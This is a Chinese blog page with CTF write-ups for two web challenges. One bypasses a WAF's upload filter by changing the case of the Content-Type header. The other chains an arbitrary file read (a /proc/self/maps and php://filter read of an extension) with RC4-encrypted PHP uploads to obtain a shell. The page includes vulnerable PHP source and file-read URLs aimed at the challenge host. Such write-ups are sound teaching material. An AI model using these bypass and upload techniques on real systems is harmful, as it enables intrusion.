+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302022118674.png" title="image-20230202211844596" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302022118674.png" alt="image-20230202211844596"></a></p>
+<h1 id="扭转乾坤"><a href="#扭转乾坤" class="headerlink" title="扭转乾坤"></a>扭转乾坤</h1><h2 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h2><ul>
+<li>利用RFC规范的差异性</li>
+</ul>
+<h2 id="0x01-题解"><a href="#0x01-题解" class="headerlink" title="0x01 题解"></a>0x01 题解</h2><p>题目需要上传一个文件，但是不让hearer里存在<code>Content-Type: multipart/form-data;.</code></p>
+<p>他应该是使用的正则匹配，匹配所有字符，而java支持参数名的大小写不敏感的写法</p>
+<p>所以只要把<code>Content-Type: multipart/form-data;</code>改成<code>Content-Type: multipart/form-datA;</code>就行</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302022145027.png" title="image-20230202214519943" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302022145027.png" alt="image-20230202214519943"></a></p>
+<h2 id="0x02-参考连接"><a href="#0x02-参考连接" class="headerlink" title="0x02 参考连接"></a>0x02 参考连接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/meCnXNknfSOS8oY7hHICPQ">从RFC规范看如何绕过waf上传表单(上篇)</a>【麻辣隔壁，下篇在哪】</li>
+</ul>
+<h1 id="unusual-php"><a href="#unusual-php" class="headerlink" title="unusual php"></a>unusual php</h1><h2 id="0x00-3"><a href="#0x00-3" class="headerlink" title="0x00"></a>0x00</h2><p>第一次见这种题。。。</p>
+<ul>
+<li>RC4解密</li>
+<li>so文件逆向</li>
+</ul>
+<h2 id="0x01-源码分析-2"><a href="#0x01-源码分析-2" class="headerlink" title="0x01 源码分析"></a>0x01 源码分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]==<span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]==<span class="string">&quot;read&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]==<span class="string">&quot;version&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以读取文件，上传文件，和查看phpinfo</p>
+<p>上传文件可以自己做一个上传表单，然后改参数</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://80.endpoint-6e181b04b4e8473881a85f547fdcb7a8.m.ins.cloud.dasctf.com:81/?a=upload&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当上传一个php文件然后去upload&#x2F;1.php访问时会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: file can&#x27;t parse in Unknown on line 0</span><br></pre></td></tr></table></figure>
+
+<p>不能解析。。。。。。</p>
+<p>然后在读取index.php的时候返回的也是乱码</p>
+<p>可能是做了什么处理</p>
+<p>去phpinfo里看看，可以发现开启了一个<code>zend-test</code>扩展</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302031137855.png" title="image-20230203113750816" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302031137855.png" alt="image-20230203113750816"></a></p>
+<p>因为这里可以直接读取文件，所以查看一下内存，通过<code>/proc/self/maps</code>查看内存映射，能够看到相关动态链接库的名字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://80.endpoint-e3b2218dc1d446008a7cacc77c3d9bee.ins.cloud.dasctf.com:81/?a=read&amp;file=/proc/self/maps</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302031348901.png" title="image-20230203134837812" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302031348901.png" alt="image-20230203134837812"></a></p>
+<p>将这个文件用base64编码读取，然后使用cyberchef将base64解码并保存在文件中，使用idea反编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://80.endpoint-e3b2218dc1d446008a7cacc77c3d9bee.ins.cloud.dasctf.com:81/?a=read&amp;file=php://filter/read=convert.base64-encode/resource=/usr/local/lib/php/extensions/no-debug-non-zts-20190902/zend_test.so</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302031427135.png" title="image-20230203142716046" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302031427135.png" alt="image-20230203142716046"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302031428902.png" title="image-20230203142859866" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302031428902.png" alt="image-20230203142859866"></a></p>
+<p>这里大概就是说，在解析一个文件的时候，先用密钥<code>abcsdfadfjiweur</code>进行RC4加密，在判断文件内容是否带有字符串’php’，如果有就把他写入就把他写入mytmpfile，即<code>/tmp/fuck.php</code>，并包含<code>/tmp/fuck.php</code>文件</p>
+<p>没有的话就发送错误’file can&#96;t parse’</p>
+<p>因为RC4是对称加密算法，所以只要我们在上传文件之前就把内容进行rc4加密，而他再进行加密操作后就会对内容进行rc4解密</p>
+<h2 id="0x02-题解-2"><a href="#0x02-题解-2" class="headerlink" title="0x02 题解"></a>0x02 题解</h2><p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302031444742.png" title="image-20230203144414674" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302031444742.png" alt="image-20230203144414674"></a></p>
+<p>上传文件进行访问后成功获得shell</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302031444573.png" title="image-20230203144450501" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302031444573.png" alt="image-20230203144450501"></a></p>
+<p>然后在根目录发现flag</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302031446782.png" title="image-20230203144634712" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302031446782.png" alt="image-20230203144634712"></a></p>
+<h2 id="0x03-参考连接-1"><a href="#0x03-参考连接-1" class="headerlink" title="0x03 参考连接"></a>0x03 参考连接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man5/proc.5.html">https://man7.org/linux/man-pages/man5/proc.5.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.xaitx.com/">小艾师傅</a></li>
+</ul>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/nodejs/'>
+                            nodejs
+                        </a>
+                    
+                        <a href='/tags/php/'>
+                            php
+                        </a>
+                    
+                        <a href='/tags/CTF/'>
+                            CTF
+                        </a>
+                    
+                        <a href='/tags/java/'>
+                            java
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/WP/'>
+                            WP
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
